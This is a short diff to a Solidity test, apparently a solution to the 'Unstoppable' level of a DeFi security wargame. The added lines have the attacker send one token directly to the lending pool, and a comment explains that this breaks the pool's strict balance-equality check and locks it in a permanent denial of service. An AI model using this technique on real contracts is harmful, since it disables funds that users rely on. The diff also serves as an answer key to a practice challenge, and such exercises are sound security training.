@@ -56,6 +56,12 @@ contract Unstoppable is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+        
+        vm.prank(attacker);
+        // forces a token push to pool which doesn't update `poolBalance`, causing poolBalance != dvt.balanceOf(pool) to always be true
+        // leading to dos.
+        dvt.transfer(address(unstoppableLender), 1);
+        
         /** EXPLOIT END **/
         vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
         validation();
